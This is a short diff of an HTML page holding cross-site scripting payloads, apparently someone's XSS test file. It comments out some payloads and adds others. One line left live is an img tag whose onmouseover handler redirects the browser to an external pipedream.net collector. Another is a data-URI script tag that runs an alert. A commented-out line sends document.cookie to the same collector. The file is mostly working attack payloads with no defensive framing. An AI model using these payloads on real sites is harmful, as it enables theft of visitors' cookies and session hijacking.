@@ -7,11 +7,14 @@
   <!--<script>
     var cookie = document.cookie;
   </script>-->
-  <img src="https://11c9bf472599957da48779c59702d232.m.pipedream.net/?domain='+document.domain+'">
+  <!-- <img src="https://11c9bf472599957da48779c59702d232.m.pipedream.net/?domain='+document.domain+'"> -->
   <!-- <img src='https://11c9bf472599957da48779c59702d232.m.pipedream.net/?cookie="+document.cookie+"'> -->
-  <img src="data:text/html,<script>alert('XSS')</script>">
+  <!-- <img src="data:text/html,<script>alert('XSS')</script>"> -->
+  
   <img src="x" onmouseover="location.href='https://11c9bf472599957da48779c59702d232.m.pipedream.net/?cookie='+document.domain+">
-  <IMG width='100' height='100' SRC=`javascript:alert("RSnake says, 'XSS'")`>
+  <script src=data:,alert(document.domain)></script>
+  
+  <!--<IMG width='100' height='100' SRC=`javascript:alert("RSnake says, 'XSS'")`>-->
 </head>
 <body>
 </body>
